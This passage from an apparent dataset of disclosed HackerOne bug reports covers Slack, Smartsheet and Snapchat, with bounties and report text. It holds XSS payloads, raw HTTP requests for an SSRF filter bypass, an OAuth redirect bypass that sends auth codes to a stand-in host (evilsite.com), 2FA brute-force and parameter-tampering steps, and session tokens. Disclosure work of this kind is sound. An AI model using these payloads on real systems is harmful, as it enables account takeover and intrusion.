when try to comment the xss payload , then upon clicking xss payload executed.2 attachments:F73511: 11.PNGF73512: 12.PNG",https://hackerone.com/reports/116419,California,United States,San Francisco,2016,2,14,18,53
Slack,1001-5000,0.0,200m-1b,"$2,000.00",No value,0.0,Improper Authentication - Generic,Authentication bypass leads to sensitive data exposure (token+secret),secalert  submitted a report to Slack.Apr 11th (7 years ago),https://hackerone.com/reports/129918,California,United States,San Francisco,2016,4,11,21,8
Slack,1001-5000,0.0,200m-1b,"$1,500.00",Critical,9.5,Information Disclosure,AWS bucket leading to iOS test build code and configuration exposure,kiyell  submitted a report to Slack.Sep 3rd (4 years ago),https://hackerone.com/reports/404822,California,United States,San Francisco,2018,9,3,17,40
Slack,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Violation of Secure Design Principles,Broken Authentication (including Slack OAuth bugs),"anandprakash_  submitted a report to Slack.Mar 1st (9 years ago)Hi,
Hope you are doing good!
Please have a look at the below report.
Description:
OAuth Framework Flaw Bypassing redirect_uri validation
An attacker to exploit this Flaw just needs to find a open redirection flaw in the site which is using Slack's OAuth for logins.
Impact:
A malicious user can steal ""code"" parameter value assigned by Slack OAuth and can hijack victim's account by writing the value in a text file on his evilsite.com/a.php file.
Steps to reproduce:
1) Go to any web app which is using Slack's  OAuth and click on Login with Slack
2) You will be redirected to this URL
https://slack.com/oauth/authorize?client_id=...&scope=read,post&redirect_uri=https://www.givensite.com/../../redirect_url=https://www.evilsite.com/a.php%2Fcomplete
Note i am bypassing the redirect_uri validation by using ../../
In the above URL,i have changed the value of redirect_uri to ../../redirect_url=https://www.evilsite.com/a.php and this should not happen.
The response will be
http://givensite.com/redirect_url=https:/www.evilsite.com/a.php/complete?code=AQCbhUg1FiEQf5TyTesMgjP8zq
And then in the final step code value or access_token value will be written in my a.php file,the malicious guy will scrap it from the URL.
So,then he can login into the victim account using code value.
Please put proper validation on redirect_uri parameter.
The redirect_uri value should exactly match as defined in the application and the user to not be allowed to change it to the subdirectories etc.
This means if redirect_uri value is https://www.google.com then it should take the value https://www.google.com not https://www.google.com/a/x
Looking forward to hear from you,
Best regards,
Anand",https://hackerone.com/reports/2559,California,United States,San Francisco,2014,3,1,11,56
Slack,1001-5000,0.0,200m-1b,$100.00,No value,0.0,None,"Bypass of the SSRF protection (Slack commands, Phabricator integration)","agarri_fr  submitted a report to Slack.May 11th (8 years ago)Abstract
Some Slack features like ""Integrations / Phabricator"" and ""Integration / Slash Commands"" allow users to submit URL that will be accessed by the backend servers. A blacklist tries to forbid access to internal resources (loopback, 10.0.0.0/8, 192.168.0.0/24, ...). This blacklist can be bypassed using ""[::]"" as the hostname. Only services binding all the interfaces and supporting IPv6 can be reached using that vector.
Integration features
Slack commands
Modify the ""url"" property of the ""/ssrf"" Slack command (with ""http://[::]:25/"" as the destination)
    POST /services/4814366410 HTTP/1.1
Host: agarri.slack.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://agarri.slack.com/services/4814366410?updated=1
Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 148
    crumb=s-1431286469-c73f073ed6-%E2%98%83&edit_service=1&is_edit=1&command=/ssrf&url=http://[::]:25/&method=GET&in_autocomplete=on&desc=&usage=&label=
Execute the Slack command ""/ssrf""
    POST /api/chat.command?t=1431286754 HTTP/1.1
Host: agarri.slack.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Referer: https://agarri.slack.com/messages/general/
Content-Length: 133
Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
    agent=webapp&command=/ssrf&text=&channel=C04QDFHLT&token=xoxs-4829527689-4829527691-4814341714-d0346ec616&set_active=true&_attempts=1
Access port TCP/25 on loopback
    HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Cache-Control: private, no-cache, no-store, must-revalidate
Content-Type: application/json; charset=utf-8
Date: Mon, 11 May 2015 20:28:06 GMT
Expires: Mon, 26 Jul 1997 05:00:00 GMT
Pragma: no-cache
Server: Apache
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
X-Accepted-OAuth-Scopes: post
X-Content-Type-Options: nosniff
X-OAuth-Scopes: identify,read,post,client,admin
X-XSS-Protection: 0
Content-Length: 120
Connection: keep-alive
    {""ok"":true,""response"":""220 squid3.tinyspeck.com ESMTP Postfix\r\n221 2.7.0 Error: I can break rules, too. Goodbye.\r\n""}
Phabricator
This vector is very similar to the previous one. If the port is opened, a HTTP 302 code is received. If not, an error 500 is generated. Outside of that, this vector is blind.
Request for http://[::]:22/
    POST /services/4836378801 HTTP/1.1
Host: agarri.slack.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://agarri.slack.com/services/4836378801?updated=1
Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
    edit_service=1&edit_label=1&phabricator_url=http://[::]:22/&conduit_user=Yolo&conduit_cert=foobar&import_phriction=1&import_pastes=1
302 Found
    HTTP/1.1 302 Found
Content-Type: text/html
Date: Mon, 11 May 2015 20:16:02 GMT
Location: /services/4836378801?updated=1
Server: Apache
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Connection: keep-alive
Request for http://[::]:11/
    POST /services/4836378801 HTTP/1.1
Host: agarri.slack.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://agarri.slack.com/services/4836378801?updated=1
Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
    edit_service=1&edit_label=1&phabricator_url=http://[::]:21/&conduit_user=Yolo&conduit_cert=foobar&import_phriction=1&import_pastes=1
500 Error
    HTTP/1.1 500 Server Error
Cache-Control: private, no-cache, no-store, must-revalidate
Content-Type: text/html; charset=utf-8
Date: Mon, 11 May 2015 20:22:11 GMT
Expires: Mon, 26 Jul 1997 05:00:00 GMT
Pragma: no-cache
Server: Apache
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 0
Content-Length: 32657
Connection: keep-alive
    <snip>
Identified services
SSH on TCP/22
    SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4
Protocol mismatch.
SMTP on TCP/25
    220 squid3.tinyspeck.com ESMTP Postfix
221 2.7.0 Error: I can break rules, too. Goodbye.
Squid on TCP/3128
    [...]
Code 676 BytesWrap lines Copy Download1    <h1>ERROR</h1>
2    <h2>The requested URL could not be retrieved</h2>
3    [...]
4    <p>The following error was encountered while trying to retrieve the URL: <a href=""/?token=wW0Mjd9kSTPzazuTzHPkLNpI&team_id=T04QDFHL9&team_domain=agarri&channel_id=C04QDFHLT&channel_name=general&user_id=U04QDFHLB&user_name=nico&command=/ssrf&text="">/?token=wW0Mjd9kSTPzazuTzHPkLNpI&team_id=T04QDFHL9&team_domain=agarri&channel_id=C04QDFHLT&channel_name=general&user_id=U04QDFHLB&user_name=nico&command=/ssrf&text=</a></p>
5    <blockquote id=""error"">
6    <p><b>Invalid URL</b></p>
7    </blockquote>
8    [...]
9    Generated Mon, 11 May 2015 20:34:46 GMT by localhost (squid\/3.1.19)
10    [...]",https://hackerone.com/reports/61312,California,United States,San Francisco,2015,5,11,21,42
Slack,1001-5000,0.0,200m-1b,$850.00,High,8.1,Cross-site Scripting (XSS) - Generic,Bypass to postMessage origin validation via FTP,a1kmm-  submitted a report to Slack.Mar 4th (6 years ago),https://hackerone.com/reports/210654,California,United States,San Francisco,2017,3,4,14,7
Slack,1001-5000,0.0,200m-1b,$750.00,No value,0.0,Command Injection - Generic,Code Injection in Slack's Windows Desktop Client leads to Privilege Escalation,"fbogner  submitted a report to Slack.Aug 24th (6 years ago)Hi,
This report is about a Code Injection vulnerability in Slack's Windows Desktop Client (slack.exe) that allows any local user to inject code into other user's Slack client.
It has been verified on a fully patched english Windows 7 64bit running the latest available Slack Desktop Client (2.1.1 32-Bit Direct Download). 
The issue is that slack.exe tries to load its OpenSSL configuration from the non-existing file
C:\usr\local\ssl\openssl.cnf (See Procmon screenshot). As any authenticated Windows user is allowed to
create new folders at the system drive's root, the expected folder structure can be created by anyone. 
This enables any local user to create the expected OpenSSL config file. Using this config file it is then possible to instruct OpenSSL to load additional libraries. This finally leads to arbitrary code execution in other user's slack.exe process. This is especially a problem as Slack is automatically started after logging in.
Here's a video illustrating the attack: https://owncloud.bogner.sh/s/MRXZSp0YyfK9ycf
Additionally you can download the source code and the binary version of the used payloads here: https://owncloud.bogner.sh/s/z7kbZr9STr08R73
To fix this vulnerability the OpenSSL config file should only be loaded from secure locations (like somewhere from within the application's root folder)
If you have any questions just let me know.
Florian1 attachment:F114492: Screen_Shot_2016-08-24_at_09.48.52.png",https://hackerone.com/reports/162955,California,United States,San Francisco,2016,8,24,8,27
Slack,1001-5000,0.0,200m-1b,$500.00,No value,0.0,Improper Authentication - Generic,Bypass  two-factor authentication,"kamikaze  submitted a report to Slack.Mar 9th (7 years ago)If a user set 2FA, a user has to enter verification code when a user tries to reset password. 
Under the ""Password Reset"" page, a user can enter wrong two-factor authentication code many times. I said ""many times"" because your bug bounty policy stated...
Exclusions
Issues found through automated testing
So, I may not be allowed to brute force in order to check how many times a user can enter wrong 2FA codes. I didn't use any automated tools and didn't brute force for my testing.
I tested that I could still reset my password after I entered wrong 2FA codes 20 times manually. It seems that a user can brute force 2FA codes.
-----step to reproduce-----


A user sends a password reset message to user's registered email.


Go to ""Password Reset"" page from #1's message.


Set a new password and Brute force two-factor auth code



After a user reset password, a user will go to slack's home page. From that page a user can do anything. 
Two factor authentication is another layer of protection. Even if a user leaked email address and password, a user will be protected by additional security(2FA). 
If an attacker hacked victim's email, an attacker will be able to take over slack's 2FA enabled account by brute forcing 2FA code on password reset page.
Recommendation: If a user entered wrong 2FA codes many times, a user will be blocked temporary.1 attachment:F77484: slack-password.pngslacka   changed the status to Triaged. Mar 15th (7 years ago)Slack  rewarded kamikaze with a $500 bounty. Mar 23rd (7 years ago)leighhoneywell   closed the report and changed the status to Resolved. Mar 23rd (7 years ago)Hi kamikaze,
We've made some rate-limiting changes as a result of your report. Thanks for taking the time to test this and best of luck with future bug hunting!
-Leighkamikaze   requested to disclose this report. Oct 19th (5 years ago)  This report has been disclosed. Nov 18th (5 years ago)",https://hackerone.com/reports/121696,California,United States,San Francisco,2016,3,9,11,16
Slack,1001-5000,0.0,200m-1b,$200.00,No value,0.0,Violation of Secure Design Principles,Content Spoofing all Integrations in https://team.slack.com/services/new/,"jaysonzabate  submitted a report to Slack.Aug 1st (8 years ago)Hello There,
I've discovered 48+ content spoofing and confirmed all of your Integrations at https://team.slack.com/services/new/ is vulnerable to Content spoofing and exploitable to all users. Content Spoofing An attack technique used to trick a user into thinking that fake web site content is legitimate data and is an attack targeting a user made possible by an injection vulnerability in a web application. When an application does not properly handle user supplied data, an attacker can supply content to a web application, typically via a parameter value, that is reflected back to the user.
Proof of concept:
Buildbox: https://asdasda.slack.com/services/new/buildbox?error=Content%20Spoofing
Cloud 66: https://asdasda.slack.com/services/new/cloud66?error=Content%20Spoofing
Code Climate: https://asdasda.slack.com/services/new/code-climate?error=Content%20Spoofing
Codeship: https://asdasda.slack.com/services/new/codeship?error=Content%20Spoofing
Crashlytics: https://asdasda.slack.com/services/new/crashlytics?error=Content%20Spoofing
Datadog: https://asdasda.slack.com/services/new/datadog?error=Content%20Spoofing
Dropbox: https://asdasda.slack.com/services/new/dropbox?error=Content%20Spoofing
Envoy: https://asdasda.slack.com/services/new/envoy?error=Content%20Spoofing
Github: https://asdasda.slack.com/services/new/github?error=Content%20Spoofing
GoSquared : https://asdasda.slack.com/services/new/gosquared?error=Content%20Spoofing
Google Drive: https://asdasda.slack.com/services/new/gdrive?error=Content%20Spoofing
Google+ Hangouts: https://asdasda.slack.com/services/new/hangouts?error=Content%20Spoofing
Help Scout: https://asdasda.slack.com/services/new/helpscout?error=Content%20Spoofing
Heroku: https://asdasda.slack.com/services/new/heroku?error=Content%20Spoofing
Honeybadger: https://asdasda.slack.com/services/new/honeybadger?error=Content%20Spoofing
Hubot: https://asdasda.slack.com/services/new/hubot?error=Content%20Spoofing
IFTTT: https://asdasda.slack.com/services/new/ifttt?error=Content%20Spoofing
Jira: https://asdasda.slack.com/services/new/jira?error=Content%20Spoofing
Jenkins CI: https://asdasda.slack.com/services/new/jenkins-ci?error=Content%20Spoofing
Librato: https://asdasda.slack.com/services/new/librato?error=Content%20Spoofing
Magnum CI: https://asdasda.slack.com/services/new/magnum-ci?error=Content%20Spoofing
MailChimp: https://asdasda.slack.com/services/new/mailchimp?error=Content%20Spoofing
Nagios: https://asdasda.slack.com/services/new/nagios?error=Content%20Spoofing
New Relic:
Ninefold: https://asdasda.slack.com/services/new/ninefold?error=Content%20Spoofing
OpsGenie: https://asdasda.slack.com/services/new/opsgenie?error=Content%20Spoofing
PagerDuty: https://asdasda.slack.com/services/new/pagerduty?error=Content%20Spoofing
Papertrail: https://asdasda.slack.com/services/new/papertrail?error=Content%20Spoofing
Phabricator: https://asdasda.slack.com/services/new/phabricator?error=Content%20Spoofing
Pingdom: https://asdasda.slack.com/services/new/pingdom?error=Content%20Spoofing
Pivotal Tracker: https://asdasda.slack.com/services/new/pivotaltracker?error=Content%20Spoofing
RSS: https://asdasda.slack.com/services/new/rss?error=Content%20Spoofing
Raygun: https://asdasda.slack.com/services/new/raygun?error=Content%20Spoofing
Reamaze: https://asdasda.slack.com/services/new/reamaze?error=Content%20Spoofing
Rollcall: https://asdasda.slack.com/services/new/rollcall?error=Content%20Spoofing
Runscope: https://asdasda.slack.com/services/new/runscope?error=Content%20Spoofing
Screenhero: https://asdasda.slack.com/services/new/screenhero?error=Content%20Spoofing
Semaphore: https://asdasda.slack.com/services/new/semaphore?error=Content%20Spoofing
Sentry: https://asdasda.slack.com/services/new/sentry?error=Content%20Spoofing
StatusPage.io: https://asdasda.slack.com/services/new/statuspageio?error=Content%20Spoofing
Stripe: https://asdasda.slack.com/services/new/stripe?error=Content%20Spoofing
SupportFu: https://asdasda.slack.com/services/new/supportfu?error=Content%20Spoofing
Travis CI: https://asdasda.slack.com/services/new/travis?error=Content%20Spoofing
Trello: https://asdasda.slack.com/services/new/trello?error=Content%20Spoofing
Twitter: https://asdasda.slack.com/services/new/twitter?error=Content%20Spoofing
Userlike: https://asdasda.slack.com/services/new/userlike?error=Content%20Spoofing
WorkingOn: https://asdasda.slack.com/services/new/workingon?error=Content%20Spoofing
Zendesk: https://asdasda.slack.com/services/new/zendesk?error=Content%20Spoofing
Please download the screenshot proof of concept: https://www.dropbox.com/s/mnwa2pm1x4ziweg/slack%20content%20spoofing.rar
Regards,
Jayson Zabateiamcal Slack staff  changed the status to Triaged. Aug 1st (8 years ago)iamcal Slack staff  closed the report and changed the status to Resolved. Aug 4th (8 years ago)Thanks for the report. This issue has now been fixed.Slack  rewarded jaysonzabate with a $200 bounty. Aug 4th (8 years ago)jaysonzabate   agreed to disclose this report. Aug 4th (8 years ago)Oh Thank you very much.  This report has been disclosed. Sep 3rd (8 years ago)",https://hackerone.com/reports/22093,California,United States,San Francisco,2014,8,1,15,11
Slack,1001-5000,0.0,200m-1b,$500.00,No value,0.0,Privilege Escalation,Creating Post on a restricted channel,"thisishrsh  submitted a report to Slack.Jul 15th (6 years ago)Hi,
I would like to report a privilege escalation issue in which a member of the team is able to create a post on a channel even if the permission to do so is denied to him by the admin.After the admin has limited the number of users who can post to a specific public channel,an unauthorized user who does not have sufficient authority to post anything on it is able to create the post based on commands available to him.I have attached a POC for further clarification.
The admin in this case has denied the team members from creating any posts on the general channel.
In order to bypass this restriction,login as a team member, and create a command post on any channel and intercept the request. Modify the request by changing the channel ID( replace it with the channel ID of general ) and send the request.
We get the success message and on the channel also we can see that the post has been created.
Steps to reproduce:
1.Login as team member.
2.Create a command post on any public channel.
3.Intercept the request.
4.Replace the channel ID in the request with the one of general channel.
Let me know if any other help is needed.
Thanks,
Harsh.1 attachment:F105044: Privilege_Escalation_Slack.mp4",https://hackerone.com/reports/151459,California,United States,San Francisco,2016,7,15,6,44
Slack,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Violation of Secure Design Principles,Content spoofing at Stripe Integrations,"jaysonzabate  submitted a report to Slack.Jul 23rd (8 years ago)I have found Content Spoofing Vulnerable  in Slack  at Stripe Integrations vulnerability is exploitable to all users  
Proof of concept:
https://asdasda.slack.com/services/2481499413?error=content%20spoofing%20!
Regards,
Jayson Zabate1 attachment:F13643: Selection_011.pngiamcal Slack staff  closed the report and changed the status to Resolved. Jul 23rd (8 years ago)Now fixed, thanksSlack  rewarded jaysonzabate with a $100 bounty. Jul 23rd (8 years ago)jaysonzabate   agreed to disclose this report. Jul 26th (8 years ago)  This report has been disclosed. Aug 25th (8 years ago)",https://hackerone.com/reports/21248,California,United States,San Francisco,2014,7,23,20,6
Slack,1001-5000,0.0,200m-1b,$250.00,Low,2.7,Privilege Escalation,Cross-site leak allows attacker to de-anonymize members of his team from another origin,jub0bs  submitted a report to Slack.Dec 29th (2 years ago),https://hackerone.com/reports/1068153,California,United States,San Francisco,2020,12,29,12,34
Slack,1001-5000,0.0,200m-1b,"$1,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic, Stored XSS(Cross Site Scripting) In Slack App Name,"imnarendrabhati  submitted a report to Slack.Aug 15th (6 years ago)Hello Slack,
This vulnerability is about a Stored Cross Site Scripting
Slack Stored XSS In App(App Name)
Vulnerable URL(Edit App Page)
https://api.slack.com/apps/[appid]/general
https://api.slack.com/apps/A21B3V9GA/general
Vulnerable Parameter = name
Note -Its also work on other user as well.
Send this link to victim
===================
Reproduction Steps
POC Video - https://youtu.be/3jAbPjfPW1o
Screen shot is also attached.
1) Go to app edit page
https://api.slack.com/apps/[appid]/general
https://api.slack.com/apps/A21B3V9GA/general
2) In app name parameter enter the following payload
""/><script>alert(/Bhati/)</script>
3) Now open the app page in any other tab
https://bhativictim.slack.com/apps/A21B3V9GA--scriptalert-bhati-script
4) You will get a Alert Box
5) We can also send this same link to other user(victim).
Thanks,
Narendra2 attachments:F112296: xss1.pngF112297: xss2.png",https://hackerone.com/reports/159460,California,United States,San Francisco,2016,8,15,10,48
Slack,1001-5000,0.0,200m-1b,$100.00,Low,2.0,Violation of Secure Design Principles,Linux Desktop application slack executable does not use pie / no ASLR,"hanno  submitted a report to Slack.Sep 27th (4 years ago)The slack binary from the Linux desktop application is no position independent executable:
$ file usr/lib/slack/slack
usr/lib/slack/slack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, stripped
(pie executables report either ""LSB shared object"" or ""LSB pie executable"".)
Position independent executables are required for full ASLR support on Linux. Non-pie-binaries are loaded to a fixed location, thus allowing ROP attacks.
I'm aware that technically this is not a vulnerability, but a lack of a hardening feature. However given that ASLR is generally considered standard practice these days and that lack of it can mean very simple bugs can directly lead to code execution I think it deserves to be fixed.
Impact
A simple memory corruption bug like a buffer overflow can easily lead to a remote code execution bug. With ASLR these bugs are much harder and sometimes impossible to exploit.",https://hackerone.com/reports/415272,California,United States,San Francisco,2018,9,27,12,33
Slack,1001-5000,0.0,200m-1b,"$1,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic, Stored XSS(Cross Site Scripting) In Slack App Name,"imnarendrabhati  submitted a report to Slack.Aug 15th (6 years ago)Hello Slack,
This vulnerability is about a Stored Cross Site Scripting
Slack Stored XSS In App(App Name)
Vulnerable URL(Edit App Page)
https://api.slack.com/apps/[appid]/general
https://api.slack.com/apps/A21B3V9GA/general
Vulnerable Parameter = name
Note -Its also work on other user as well.
Send this link to victim
===================
Reproduction Steps
POC Video - https://youtu.be/3jAbPjfPW1o
Screen shot is also attached.
1) Go to app edit page
https://api.slack.com/apps/[appid]/general
https://api.slack.com/apps/A21B3V9GA/general
2) In app name parameter enter the following payload
""/><script>alert(/Bhati/)</script>
3) Now open the app page in any other tab
https://bhativictim.slack.com/apps/A21B3V9GA--scriptalert-bhati-script
4) You will get a Alert Box
5) We can also send this same link to other user(victim).
Thanks,
Narendra2 attachments:F112296: xss1.pngF112297: xss2.pngmaxfeldman   changed the status to Triaged. Aug 15th (6 years ago)working on a fix!maxfeldman   posted a comment. Aug 16th (6 years ago)Hi @narendrabhati,
We believe we've fixed this issue - would you mind checking that the fix has made it to your environment?
Thanks!
Max
    
    
        
            
                
                
                
            
        
    
imnarendrabhati   posted a comment. Aug 16th (6 years ago)Yaa sure !
    
    
        
            
                
                
                
            
        
    
imnarendrabhati   posted a comment. Aug 16th (6 years ago)Its also fixed ! :)maxfeldman   closed the report and changed the status to Resolved. Aug 16th (6 years ago)Thanks @narendrabhati!Slack  rewarded imnarendrabhati with a $1,000 bounty. Aug 16th (6 years ago)Thanks for a neat finding!
The Slack Security Team
    
    
        
            
                
                
                
            
        
    
imnarendrabhati   requested to disclose this report. Nov 20th (6 years ago)Can we disclose this ? @maxfeldman
    
    
        
            
                
                
                
            
        
    
imnarendrabhati   posted a comment. Nov 22nd (6 years ago)?maxfeldman   agreed to disclose this report. Nov 22nd (6 years ago)Thanks @narendrabhati for a good find!  This report has been disclosed. Nov 22nd (6 years ago)
    
    
        
            
                
                
                
            
        
    
imnarendrabhati   posted a comment. Nov 23rd (6 years ago)@maxfeldman Thanks :)",https://hackerone.com/reports/159460,California,United States,San Francisco,2016,8,15,10,48
Slack,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Violation of Secure Design Principles,RC4 cipher suites detected on status.slack.com,"linkks  submitted a report to Slack.Nov 11th (7 years ago)A group of researchers (Nadhem AlFardan, Dan Bernstein, Kenny Paterson, Bertram Poettering and Jacob Schuldt) have found new attacks against TLS that allows an attacker to recover a limited amount of plaintext from a TLS connection when RC4 encryption is used. The attacks arise from statistical flaws in the keystream generated by the RC4 algorithm which become apparent in TLS ciphertexts when the same plaintext is repeatedly encrypted.
This vulnerability affects Server.
Attack details
RC4 cipher suites (TLS1 on port 443): 
TLS1_CK_RSA_WITH_RC4_128_SHA - High strength
TLS1_CK_ECDHE_RSA_WITH_RC4_128_SHA - High strength
The impact of this vulnerability
An attacker can recover a limited amount of plaintext from a TLS connection when RC4 encryption is used. 
How to fix this vulnerability
The most effective countermeasure against this attack is to stop using RC4 in TLS. Consult web references for more information about this attack and how to protect against it.",https://hackerone.com/reports/99157,California,United States,San Francisco,2015,11,11,20,17
Slack,1001-5000,0.0,200m-1b,"$2,500.00",No value,0.0,Improper Authentication - Generic,Snooping into messages via email service,"rijalrojan  submitted a report to Slack.Aug 28th (6 years ago)Summary by rijalrojanSlack's overall response was extremely satisfying. From triage to resolve it was great to see the care and respect Slack has for reporters. It was great to work with them in fixing this vulnerability. 10/10 would research on Slack again. 
Blog post : http://blog.pentestnepal.tech/post/150381068912/how-i-snooped-into-your-private-slack-messages",https://hackerone.com/reports/163938,California,United States,San Francisco,2016,8,28,5,11
Smartsheet,1001-5000,0.0,50m-100m,$100.00,Low,3.7,Information Disclosure,Smartsheet employees email disclosure through enpoint after login.,"soareswallace  submitted a report to Smartsheet.May 21st (2 years ago)Summary:
[add summary of the vulnerability]
After login  - while validating this issue #858974 - I notice there is an endpoint call /b/home?formName=webop&formAction=SheetLabLoadData&to=68000&ss_v=98.0.2 that is bringing emails from some employees.
Steps To Reproduce:
[add details for how we can reproduce the issue]

Login with your account
While tracking traffic with your favorite traffic tracker capture the endpoint mentioned in the summary.
Check the response

I honestly search in the dashboard where this information could be used and didn't founded it. Do we need this endpoint call?
Bug Behavior
Expected: Do we need this information while loading the dashboard?
Actual: Employees email and name are being disclosed in the response
Supporting Material/References:
#858974
Impact
Unnecessarily disclosing employee emails via endpoint call.",https://hackerone.com/reports/880089,Washington,United States,Bellevue,2020,5,21,22,26
Snapchat,1001-5000,0.0,200m-1b,$400.00,No value,0.0,Cross-site Scripting (XSS) - Generic,[render.bitstrips.com] Stored XSS via an incorrect avatar property value,"s_p_q_r  submitted a report to Snapchat.Aug 16th (6 years ago)While modifying an avatar, an attacker has the opportunity to submit XSS payloads as its property values. The resulting png file will return a 500 error with the payload in the response body. The response has a text/html content type, which makes the XSS attack possible.
PoC:

Go to https://www.bitmoji.com/account/ and create a new account
Choose the avatar style and save it. The following POST request will be sent:


POST /user/avatar?styles=1,4&app_id=13 HTTP/1.1
Host: api.bitmoji.com
avatar_id=%id%&char_data=%data%

3. Modify the data value: set any pd2 object property value (for example, jaw) to <svg onload=alert(document.domain)>:
Code 369 BytesWrap lines Copy Download1{""colours"":{},""pd2"":{""cranium"":""cranium_midstraightmale"",""forehead"":""forehead_standard"",""hair_back"":""hair_back_midstraightmale"",""hair_front"":""hair_front_midstraightmale"",""hairbottom"":""hairbottom_blank"",""detail_L2_L"":""_blank"",""detail_L2_R"":""_blank"",""jaw"":""<svg onload=alert(document.domain)>"",""beard"":""_blank"",""stachin"":""_blank"",""stachout"":""_blank""},""body"":{},""style"":1}
and submit the request again.
4. Go to your account and click ""Edit yor avatar"". In your browser web console you will see a https://render.bitstrips.com/render/***/*.png link with a 500 error. Open this link.
The script will be executed.
A PoC link: https://render.bitstrips.com/render/6688424/173752531_2_s1-v1.png
I also recorded a video (see the attachment) of these steps, I hope it will help you reproduce the issue.1 attachment:F112661: bit_poc.wmv",https://hackerone.com/reports/159878,California,United States,Los Angeles,2016,8,16,23,25
Snapchat,1001-5000,0.0,200m-1b,$250.00,Medium,5.3,HTTP Request Smuggling,[spectacles.com] Bypassing quantity limit in orders,"hiorws  submitted a report to Snapchat.Jul 7th (5 years ago)Hi Snapchat team,
In the https://www.spectacles.com the quantity of orders has limited (for spectacles is 6 and for accessories is 10 according to help support page). But it can easily be manipulated by editing the URL.
Problem originates from limiting the quantity of the items is with just the UI elements just before adding to cart. After adding to cart step there is no checking step. (The last payment step is included!)
Let me show you PoC to reproduce this issue;

First add a single spectacle to cart,
i.e. Make the quantity of spectacles 6 and add both two accessories with quantity 10.
You will see the ""+"" buttons will be inactive.
Then copy the link address of ""CHECKOUT"" button
Paste it to a new tab of browser and you will see something like that;
https://orders.spectacles.com/cart/24637376965:6,24637373189:10,24637375493:10?attributes[delivery-min-days]=7&attributes[delivery-max-days]=14&attributes[locale]=en-US&checkout[shipping_address][country]=US&access_token=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&_fd=0&_ga=X.XXXXXXXXX.XXXXXXXXXX.XXXXXXXXXX-XXXXXXXXX.XXXXXXXXXX
To make an example change these values 24637376965:6,24637373189:10,24637375493:10 with these 24637376965:6,24637373189:2500,24637375493:25000 then enter
You will see the accessories quantity will be 25000 and the price will be updated according to that.
And you can pass to the last payment step with writing shipping information.

In the screenshots it will be clear and it is easy to reproduce the issue you can easily check this out.
To prevent this issue, a checking operation can be implemented to shopping web app.
Lots of thanks.
hiorws3 attachments:F200948: ss3.pngF200949: ss2.pngF200950: ss1.png",https://hackerone.com/reports/246803,California,United States,Los Angeles,2017,7,7,7,37
Snapchat,1001-5000,0.0,200m-1b,"$10,000.00",High,7.95,Information Disclosure,Access to multiple production Grafana dashboards,"damian89  submitted a report to Snapchat.Jul 30th (3 years ago)Summary by damian89While fuzzing patterns of certain snapchat related projects, I was able to find an instance of Grafana which was accessible by a guest user. That instance contained hundreds of production dashboards, valuable data about company. Furthermore one of the custom modules was vulnerable to SQL Injection.",https://hackerone.com/reports/663628,California,United States,Los Angeles,2019,7,30,12,50
Snapchat,1001-5000,0.0,200m-1b,"$1,000.00",No value,0.0,Improper Authentication - Generic,Administrator access to a Django Administration Panel on *.sc-corp.net via bruteforced credentials,"shubs  submitted a report to Snapchat.Apr 4th (7 years ago)Hey team,
